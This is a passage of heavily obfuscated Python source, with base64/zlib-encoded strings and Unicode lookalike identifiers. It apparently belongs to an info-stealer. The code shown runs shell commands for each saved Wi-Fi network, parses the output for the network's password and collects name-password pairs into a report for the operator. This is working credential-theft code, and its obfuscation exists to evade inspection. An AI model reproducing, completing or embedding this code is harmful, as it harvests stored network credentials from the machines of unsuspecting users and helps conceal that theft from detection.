__𝘪𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x0b\x0c\xaf(\xf6t\x0b\xab\x8a\x8a\xf0L\x0f\xf5\xf0*\x8b\xca\xcd)\x8e\n\xb4\xb5\x05\x00l\x0f\x08}')).decode() in 𝙞]
            for 𝘯𝙖𝘮𝗲 in 𝘄𝗶𝙛𝘪:
                try:
                    𝙧𝙚𝘴𝘂𝗹𝙩𝘀 = 𝙨𝘂𝙗𝙥𝗿𝗼𝘤𝘦𝘀𝙨.check_output([__𝗶𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xca\r3H6J\xb7\x05\x00\x0c4\x02\x8f')).decode(), __𝘪𝙢𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xdaK1\xaa\xc8HJ\xb7\xb5\x05\x00\x0c\xd2\x02\xba')).decode(), __𝗶𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK6\xca(K)\xb7\xb5\x05\x00\x0c\xe8\x02\xc9')).decode(), __𝗶𝘮𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK\xf6\xf0*\x8b\xca\xcd)\x8e\n\xb4\xb5\x05\x00\x1cv\x047')).decode(), 𝙣𝘢𝘮𝘦, __𝗶𝘮𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK4\n3\r\x08\xf7+\x8e\nw\xab\x04\x00\x18]\x03\xf7')).decode()], shell=True, stdin=𝘀𝙪𝙗𝙥𝗿𝗼𝙘𝘦𝙨𝙨.PIPE, stderr=𝘀𝘶𝘣𝙥𝗿𝘰𝗰𝗲𝘀𝘴.PIPE).decode(__𝗶𝗺𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝘪𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())
                    𝙧𝘦𝘀𝘂𝙡𝘵𝘀 = [𝘣.split(__𝘪𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝗺𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode())[𝘪𝗻𝘵.from_bytes(𝙢𝘢𝘱(lambda O, i: 650 - (𝙞𝘯𝙩(𝘖) + 𝗶), 𝗺𝗮𝘱(__𝘪𝗺𝗽𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝘪𝙩𝗲𝙧(__𝘪𝙢𝗽𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xcb\n4\x05\x00\x03Q\x01?')).decode())] * 3)), 𝘳𝘢𝘯𝘨𝙚(1)), __𝗶𝙢𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)][𝙞𝗻𝙩.from_bytes(𝘮𝙖𝘱(lambda O, i: 511 - (𝘪𝘯𝙩(𝙊) + 𝘪), 𝘮𝘢𝙥(__𝙞𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝘪𝙩𝗲𝘳(__𝗶𝗺𝘱𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\x0bq-\x07\x00\x039\x01_')).decode())] * 3)), 𝙧𝗮𝙣𝘨𝗲(1)), __𝘪𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):-𝙞𝗻𝘁.from_bytes(𝘮𝘢𝗽(lambda O, i: 905 - (𝙞𝙣𝘁(𝗢) + 𝘪), 𝘮𝘢𝙥(__𝙞𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝗶𝙩𝘦𝗿(__𝗶𝙢𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0fq4\x00\x00\x02\xee\x01\x15')).decode())] * 3)), 𝙧𝘢𝗻𝘨𝙚(1)), __𝙞𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] for 𝘣 in 𝙧𝘦𝙨𝙪𝗹𝘵𝘴 if __𝗶𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x0b6\n3\xf5t\xf5+K\xca\x0b\xcaI\xca\x0b\xb4\x05\x00*\xf3\x05O')).decode() in 𝘣]
                except 𝙨𝘶𝙗𝗽𝗿𝘰𝙘𝘦𝘀𝙨.CalledProcessError:
                    𝙣𝘦𝘁𝘸𝗼𝙧𝗸𝘴.append((𝙣𝗮𝙢𝙚, __𝘪𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()))
                    continue
                try:
                    𝗻𝘦𝘁𝙬𝗼𝙧𝙠𝙨.append((𝗻𝗮𝗺𝗲, 𝗿𝙚𝘴𝘂𝘭𝘁𝘀[𝗶𝘯𝘁.from_bytes(𝗺𝘢𝘱(lambda O, i: 548 - (𝘪𝗻𝘵(𝙊) + 𝙞), 𝘮𝘢𝙥(__𝙞𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝘁𝘦𝘳(__𝘪𝙢𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝘦(0)), __𝘪𝙢𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
                except 𝗜𝗻𝘥𝗲𝘹𝗘𝘳𝘳𝘰𝗿:
                    𝘯𝗲𝘁𝘄𝙤𝘳𝘬𝘴.append((𝘯𝘢𝗺𝗲, __𝗶𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode()))
        except 𝙨𝙪𝘣𝙥𝘳𝙤𝘤𝙚𝙨𝘴.CalledProcessError:
            pass
        except 𝙐𝙣𝘪𝙘𝗼𝗱𝘦𝘿𝙚𝗰𝙤𝘥𝙚𝙀𝙧𝗿𝙤𝙧:
            pass
        𝘰𝙪𝙩 += __𝘪𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\xcdr\xb2Lsv2\xf7\xcf\xaa\xb0tN\xb7\xb5\x05\x00F\x82\x06i')).decode().format(__𝙞𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x0b5\xf4\xf3\nr\xb4\xb5\x05\x00\n\x0f\x02,')).decode(), __𝙞𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x0buu\x0b\t5L\t\x08\xcd\x0e\xb4\x05\x00\x18\n\x03\xbd')).decode())
        𝗼𝙪𝘵 += __𝙞𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK56\xb4H56\xf0\x06\x00\t\xab\x02\x15')).decode().format(__𝙞𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\t\xb4\xb5\x05\x00\x02\xde\x01\x18')).decode() * 𝙞𝘯𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 930 - (𝘪𝙣𝘁(𝗢) + 𝘪), 𝘮𝘢𝘱(__𝘪𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝘪𝙩𝘦𝗿(__𝙞𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3\x0fq-\x07\x00\x03=\x01`')).decode())] * 3)), 𝘳𝗮𝗻𝙜𝘦(1)), __𝙞𝗺𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False), __𝙞𝗺𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\t\xb4\xb5\x05\x00\x02\xde\x01\x18')).decode() * 𝗶𝙣𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 614 - (𝙞𝘯𝙩(𝗢) + 𝘪), 𝗺𝗮𝘱(__𝗶𝘮𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝗶𝘵𝗲𝘳(__𝗶𝙢𝘱𝗼𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0bI7\x04\x00\x037\x01;')).decode())] * 3)), 𝙧𝗮𝗻𝗴𝘦(1)), __𝙞𝘮𝙥𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        for (𝘯𝘢𝙢𝗲, 𝗽𝙖𝙨𝘀𝘄𝗼𝙧𝘥) in 𝘯𝘦𝘁𝘄𝙤𝘳𝗸𝘀:
            𝘰𝘂𝘵 += __𝗶𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\xcdr\xb2Lsv2\xf7\xcf\xaa\xb0tN\xb7\xb5\x05\x00F\x82\x06i')).decode().format(𝗻𝙖𝙢𝗲, 𝗽𝘢𝙨𝙨𝙬𝗼𝗿𝙙)
        return (__𝙞𝙢𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcf\xf3+\x8822\xcdHr\xb3\xacJ\xf1\xf0\xcaI\xcaM1Ht\xc9O\x0f3\xcaqO\x0c\xb4\xb5\x05\x00\xb2\xb7\n\xa7')).decode(), __𝙞𝗺𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8btwJO56L\x8ftw\xb4\x05\x00\x18&\x03\x98')).decode().format(𝙤𝘂𝘁), False)